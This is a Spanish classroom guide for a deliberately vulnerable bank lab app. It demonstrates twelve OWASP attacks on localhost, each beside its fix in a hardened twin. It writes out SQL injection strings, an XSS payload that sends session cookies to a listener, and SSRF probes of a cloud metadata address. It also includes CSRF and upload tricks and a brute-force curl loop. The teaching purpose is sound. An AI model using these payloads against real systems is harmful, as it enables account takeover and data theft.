# Guía de pruebas — SecureBank Lab (clase de seguridad)

Guion completo y reproducible de todos los ataques. Cada sección tiene: qué es, dónde,
pasos exactos en la app **vulnerable** (`:3001`), impacto que verá la clase, la misma
prueba en la app **segura** (`:3002`), por qué se bloquea (código) y la herramienta.

> Regla de oro: **solo** contra `localhost` / LAN del curso. Dinero ficticio. No publicar la app vulnerable.

---

## 0. Preparación antes de la clase

### 0.1 Levantar ambas apps

```bash
# Terminal 1 — vulnerable
cd "vulnerable"
npm install        # solo la primera vez
npm run reset      # deja datos limpios (alice, bob, admin)
npm start          # http://localhost:3001

# Terminal 2 — segura
cd "segura"
npm install        # solo la primera vez
npm run reset
npm start          # http://localhost:3002
```

### 0.2 Cuentas demo (iguales en ambas)

| Usuario | Contraseña  | Saldo   |
|---------|-------------|---------|
| alice   | password123 | 1500.00 |
| bob     | password123 | 800.00  |
| admin   | admin123    | 10000.00|

### 0.3 Herramientas

| Herramienta | Para qué | Instalación |
|-------------|----------|-------------|
| Navegador + DevTools | Cookies, red, consola, DOM | Ya lo tienes (F12) |
| `curl` | Headers y requests reproducibles | Ya viene en macOS/Linux |
| Burp Suite Community / OWASP ZAP | Interceptar y repetir peticiones | portswigger.net / zaproxy.org |
| DB Browser for SQLite | Ver `data.sqlite` (passwords) | sqlitebrowser.org |
| sqlmap (opcional) | Automatizar SQLi | `brew install sqlmap` / `pip install sqlmap` |

### 0.4 Consejo de proyección
- Dos ventanas del navegador lado a lado: izquierda VULNERABLE (badge rojo), derecha SEGURA (badge verde).
- Ventana de terminal grande para `curl`.
- Usa modo incógnito separado por app para no mezclar sesiones/cookies.

### 0.5 Resetear entre grupos
En cada carpeta: `npm run reset` y reinicia (`Ctrl+C` y `npm start`). Vuelve a saldos y datos iniciales.

---

## Metodología por ataque (repite este ritmo)

1. Nombro el riesgo OWASP (1 min).
2. Lo ejecuto en VULNERABLE → muestro el impacto real (saldo, sesión, dinero).
3. Repito exactamente lo mismo en SEGURA → se bloquea.
4. Abro el diff del código (`vulnerable/server.js` vs `segura/server.js`).
5. Cierro con la herramienta (DevTools / Burp / curl).

---

## Ataque 1 — SQL Injection en login (A03)

**Qué es:** la entrada del usuario se concatena en la consulta SQL y altera su lógica.

**Dónde:** `POST /login`, pantalla "Entrar".

**Código vulnerable** (`vulnerable/server.js`):

```js
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

### Pasos en VULNERABLE (:3001)
1. Ve a `http://localhost:3001/login`.
2. Usuario: `admin' --`
3. Contraseña: cualquier cosa (ej. `x`).
4. Entrar.

**Impacto:** inicias sesión como **admin sin saber la contraseña**. El `--` comenta el resto del SQL.

Variante para explicar el "OR verdadero": usuario `' OR '1'='1' --`, entra con el primer usuario de la tabla.

### Pasos en SEGURA (:3002)
- Mismo `admin' --` / `x` → **"Credenciales incorrectas"**.

**Por qué se bloquea** (`segura/server.js`): consulta parametrizada + hash:

```js
const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
const ok = user && (await bcrypt.compare(password || '', user.password));
```

El `?` trata la entrada como dato, nunca como código SQL.

### Herramienta
- Burp/ZAP: intercepta el POST y muestra el payload en el parámetro `username`.
- Opcional sqlmap (solo local):
```bash
sqlmap -u "http://localhost:3001/login" --data="username=a&password=b" --batch --dbs
```

**Puntos a explicar:** datos vs código; por qué "sanitizar a mano" falla y los prepared statements no.

---

## Ataque 2 — SQL Injection en búsqueda (A03)

**Dónde:** `GET /search?q=`, pantalla "Buscar".

**Código vulnerable:**
```js
const sql = `... WHERE t.concept LIKE '%${q}%'`;
```

### Pasos en VULNERABLE
1. Login como alice.
2. Ve a Buscar.
3. Escribe: `' OR '1'='1`  → devuelve **todos los movimientos** (no solo los tuyos).
4. Para mostrar el error/estructura: `x' UNION SELECT 1,2,3,4,5,6,7 --` (ajusta columnas hasta que cuadre; sirve para enseñar enumeración).

**Impacto:** fuga de datos de toda la tabla de movimientos.

### Pasos en SEGURA
- Mismo `' OR '1'='1` → lo trata como texto literal: 0 resultados, sin fuga.

**Por qué se bloquea:** `WHERE t.concept LIKE ?` con `'%' + q + '%'` como parámetro + límite de longitud.

### Herramienta
- Navegador (se ve en la URL) y Burp para repetir.

---

## Ataque 3 — XSS almacenado (Stored XSS)

**Qué es:** guardas HTML/JS que se ejecuta en el navegador de quien vea la página.

**Dónde:** `POST /messages`, pantalla "Soporte". La vista vulnerable usa `<%- m.body %>` (sin escape).

### Pasos en VULNERABLE
1. Login como alice.
2. Soporte → mensaje:
   ```html
   <script>alert('XSS de ' + document.cookie)</script>
   ```
3. Publicar. Al recargar, salta el `alert` con la cookie de sesión.
4. Demo de robo de sesión (impacto real): publica
   ```html
   <script>new Image().src='http://localhost:9999/c?'+document.cookie</script>
   ```
   y abre un listener para ver la cookie llegar:
   ```bash
   # terminal extra
   python3 -m http.server 9999
   ```
   Cuando bob (u otro) abra Soporte, su cookie aparece en el log del servidor 9999.

**Impacto:** robo de cookie de sesión → secuestro de cuenta. Conecta con el Ataque 7 (cookie sin HttpOnly).

### Pasos en SEGURA
- Mismo mensaje → se muestra como **texto**, no se ejecuta. Además la CSP bloquea scripts inline.

**Por qué se bloquea:** vista con `<%= m.body %>` (escape automático) + `helmet` con `script-src 'self'` + cookie `httpOnly`.

### Herramienta
- DevTools → pestaña Application/Storage → Cookies (mostrar que en vulnerable la cookie es legible por JS; en segura marca HttpOnly).

---

## Ataque 4 — XSS reflejado (Reflected XSS)

**Dónde:** `GET /search?q=` (el término se refleja en la página).

### Pasos en VULNERABLE
1. Login.
2. En Buscar escribe: `<img src=x onerror=alert(1)>` y busca.
3. Se ejecuta al renderizar el título "Resultados para: ...".
   - Nota: el título usa `<%- q %>` en vulnerable.

**Impacto:** un enlace preparado (`/search?q=<script>...`) ejecuta código en la víctima que haga clic.

### Pasos en SEGURA
- Mismo payload → aparece como texto escapado. CSP añade defensa extra.

**Por qué se bloquea:** `<%= q %>` (escape) + límite de longitud + CSP.

### Herramienta
- Navegador; comparte el enlace malicioso para ilustrar el vector.

---

## Ataque 5 — IDOR / Broken Access Control (A01)

**Qué es:** acceder a recursos de otro usuario cambiando un identificador.

**Dónde:** `GET /account?id=`.

### Pasos en VULNERABLE
1. Login como **alice** (id 1).
2. Ve a `http://localhost:3001/account?id=2`.

**Impacto:** ves la **cuenta de bob**: su saldo, email y movimientos. Cambia a `?id=3` para ver a admin (10000).

### Pasos en SEGURA
- Login como alice → `http://localhost:3002/account?id=2` → **"Acceso denegado (403)"**, te devuelve a tu propia cuenta.

**Por qué se bloquea** (`segura/server.js`):
```js
if (requested && requested !== req.session.user.id) { /* 403 */ }
```
El servidor ignora el id pedido y usa siempre el de la sesión.

### Herramienta
- Navegador (basta cambiar la URL). Burp para mostrar fuzzing de `id`.

**Bonus IDOR (perfil):** en vulnerable, `POST /profile/email` acepta `user_id` de otro usuario y edita su email. En segura se ignora y solo edita el tuyo.

---

## Ataque 6 — CSRF (Cross-Site Request Forgery)

**Qué es:** una web maliciosa hace que tu navegador envíe una acción autenticada sin tu consentimiento.

**Dónde:** `POST /transfer` (transferencia de dinero).

**Archivo listo:** `labs/csrf-demo.html`.

### Pasos en VULNERABLE
1. Login como **alice** en `:3001` y deja la pestaña abierta.
2. Mira el saldo de alice (1500) y de bob (`/account?id=2`, 800).
3. Abre `labs/csrf-demo.html` en el navegador (doble clic o `open labs/csrf-demo.html`).
4. La página se autoenvía y transfiere **$10 de alice a bob** sin que alice lo pida.
5. Refresca el dashboard de alice: saldo bajó; el de bob subió.

**Impacto:** transferencia de dinero forzada solo por visitar una web con la sesión abierta.

### Pasos en SEGURA
1. Login como alice en `:3002`.
2. Edita `labs/csrf-demo.html` y cambia la URL del `action` a `http://localhost:3002/transfer` (o crea una copia).
3. Ábrela → **"CSRF rechazado: token inválido o ausente"**. No hay transferencia.

**Por qué se bloquea:** middleware `csurf`; cada formulario legítimo lleva un `_csrf` que el atacante no puede adivinar. Además `SameSite=lax` en la cookie.

### Herramienta
- El propio HTML del lab; DevTools → Network para ver el POST cross-site.

---

## Ataque 7 — Fallos de autenticación y cookies (A07 / A02)

**Qué es:** contraseñas mal guardadas y cookies de sesión inseguras.

### 7a. Passwords en texto plano
1. Abre `vulnerable/data.sqlite` con DB Browser for SQLite.
2. Tabla `users` → la columna `password` está en **texto plano** (`password123`).
3. Abre `segura/data.sqlite` → mismos usuarios pero con **hash bcrypt** (`$2a$10$...`).

Sin DB Browser, por terminal:
```bash
cd "vulnerable" && node -e "console.log(require('./db').prepare('SELECT username,password FROM users').all())"
cd "segura"     && node -e "console.log(require('./db').prepare('SELECT username,password FROM users').all())"
```

**Impacto:** si se filtra la BD vulnerable, todas las contraseñas quedan expuestas.

### 7b. Cookie sin HttpOnly
1. En `:3001`, login y abre DevTools → Console:
   ```js
   document.cookie
   ```
   Se ve la cookie de sesión (`connect.sid`) → **JS puede leerla** (esto habilita el robo del Ataque 3).
2. En `:3002`, `document.cookie` **no** muestra la cookie de sesión (marcada `HttpOnly`).
   - Compruébalo en DevTools → Application → Cookies: columna HttpOnly marcada solo en la segura.

**Por qué se bloquea:** `cookie: { httpOnly: true, sameSite: 'lax' }` + `bcrypt` para hashing + `req.session.regenerate()` al iniciar sesión (evita fijación de sesión).

---

## Ataque 8 — Subida de archivos insegura (A01/A05)

**Qué es:** subir archivos con nombre/extensión peligrosos.

**Dónde:** `POST /profile/avatar`, pantalla "Perfil".

### Pasos en VULNERABLE
1. Login. Perfil → sección Avatar.
2. En "Nombre de archivo" escribe `pwn.html` (o `../algo`) y sube cualquier archivo con contenido HTML.
3. La app guarda el archivo con **ese nombre y extensión** en `/uploads`.
4. Ábrelo: `http://localhost:3001/uploads/pwn.html` → se sirve tal cual.

**Impacto:** subir contenido no esperado (HTML/JS) servido desde el dominio del banco; base para XSS/defacement o algo peor en apps que ejecutan lo subido.

### Pasos en SEGURA
- El formulario solo acepta imágenes; con `pwn.html` → **"Solo se permiten imágenes: jpg, png, gif, webp"**.
- Si subes una imagen, se guarda con **nombre aleatorio** y su extensión validada.

**Por qué se bloquea:** `fileFilter` con allowlist de extensiones, límite de tamaño (1 MB) y `filename` aleatorio (`crypto.randomBytes`).

### Herramienta
- Navegador; opcional Burp para manipular `filename`/`Content-Type`.

---

## Ataque 9 — SSRF (A10)

**Qué es:** el servidor hace peticiones a URLs que controla el atacante (red interna, metadata).

**Dónde:** `POST /preview`, pantalla "Verificar URL".

### Pasos en VULNERABLE
1. Login. Ve a "Verificar URL".
2. Prueba una URL interna/local, por ejemplo:
   - `http://127.0.0.1:3001/` (el propio banco)
   - `http://localhost:3002/` (la otra app)
   - `http://169.254.169.254/` (endpoint típico de metadata en cloud, para explicar el riesgo real)
3. El servidor **trae la respuesta** de esa URL interna y te la muestra.

**Impacto:** desde fuera puedes hacer que el servidor lea recursos internos no accesibles para ti.

### Pasos en SEGURA
- Mismas URLs → **"Host no permitido"**. Solo funciona con la allowlist (`example.com`, `httpbin.org`).

**Por qué se bloquea:** validación de protocolo (`http/https`) + allowlist de hosts antes de hacer la petición.

### Herramienta
- Navegador; Burp para probar múltiples destinos.

---

## Ataque 10 — Falta de rate limiting (A04 Insecure Design)

**Qué es:** sin límite de intentos, se puede hacer fuerza bruta al login.

### Pasos en VULNERABLE
Fuerza bruta rápida con `curl` (todos responden, sin bloqueo):
```bash
for p in 1234 admin qwerty password123 letmein; do
  curl -s -o /dev/null -w "$p -> %{http_code}\n" \
    -X POST http://localhost:3001/login -d "username=alice&password=$p"
done
```
Puedes lanzar cientos de intentos sin freno.

### Pasos en SEGURA
```bash
for i in $(seq 1 25); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST http://localhost:3002/login -d "username=alice&password=x"
done; echo
```
Tras ~20 intentos en la ventana, responde **429 (Too Many Requests)**.

**Por qué se bloquea:** `express-rate-limit` en `/login` (20 intentos / 15 min).

> Nota: la app segura también exige token CSRF; para brute force real habría que incluirlo. El objetivo aquí es mostrar el 429 del rate limit.

---

## Ataque 11 — Security misconfiguration / headers (A05)

**Qué es:** falta de cabeceras de seguridad.

### Comparación con curl
```bash
echo "=== VULNERABLE ===" && curl -sI http://localhost:3001/login
echo "=== SEGURA ==="     && curl -sI http://localhost:3002/login
```

**Qué señalar:**
- Vulnerable: **no** hay `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`.
- Segura: aparecen todos (los pone `helmet`).

**Impacto:** sin `X-Frame-Options` → clickjacking; sin CSP → XSS más fácil; sin `nosniff` → MIME sniffing.

---

## Ataque 12 — Logging y monitoreo (A09)

**Qué es:** sin registro de eventos, un ataque pasa desapercibido.

### Pasos
1. En VULNERABLE, falla el login varias veces → no queda rastro (no hay tabla de eventos).
2. En SEGURA, falla el login varias veces y revisa la tabla `auth_events`:
```bash
cd "segura" && node -e "console.log(require('./db').prepare('SELECT * FROM auth_events ORDER BY id DESC LIMIT 10').all())"
```
Verás filas con `username`, `success=0`, IP y fecha.

**Por qué importa:** con logs puedes detectar fuerza bruta o accesos raros; sin ellos, no.

---

## Orden sugerido y tiempos (sesión ~60-75 min)

| # | Ataque | OWASP | Min |
|---|--------|-------|-----|
| 1 | SQLi login | A03 | 8 |
| 2 | SQLi búsqueda | A03 | 5 |
| 3 | XSS almacenado + robo de cookie | A03/A07 | 10 |
| 4 | XSS reflejado | A03 | 4 |
| 5 | IDOR cuenta/perfil | A01 | 7 |
| 6 | CSRF transferencia | A08 | 8 |
| 7 | Passwords + cookie | A02/A07 | 7 |
| 8 | Upload inseguro | A01/A05 | 5 |
| 9 | SSRF | A10 | 5 |
| 10 | Rate limit | A04 | 4 |
| 11 | Headers | A05 | 4 |
| 12 | Logging | A09 | 3 |

---

## Checklist para el día de la clase

- [ ] `npm run reset` + `npm start` en ambas apps.
- [ ] Ambas abren: `http://localhost:3001` y `http://localhost:3002`.
- [ ] Sesiones limpias (incógnito o borra cookies).
- [ ] `labs/csrf-demo.html` a mano.
- [ ] DB Browser abierto con `vulnerable/data.sqlite` y `segura/data.sqlite`.
- [ ] Terminal grande para `curl`.
- [ ] (Opcional) Burp/ZAP configurado con proxy del navegador.
- [ ] Servidor de captura para XSS (`python3 -m http.server 9999`) si harás robo de cookie.

---

## Solución de problemas

| Síntoma | Causa probable | Arreglo |
|---------|----------------|---------|
| El login no persiste | Cookies viejas de otra config | Borra cookies del sitio o usa incógnito |
| "address already in use" | Puerto ocupado por instancia previa | `lsof -ti:3001 \| xargs kill -9` (o 3002) |
| Datos raros tras varias demos | Saldos ya modificados | `npm run reset` y reinicia |
| CSRF demo no transfiere en vulnerable | No hay sesión abierta de alice | Inicia sesión en `:3001` primero |
| El `alert` de XSS no salta en segura | Está mitigado (correcto) | Es el resultado esperado |

---

## Reset entre grupos
```bash
cd "vulnerable" && npm run reset
cd "segura" && npm run reset
# reinicia ambos npm start
```
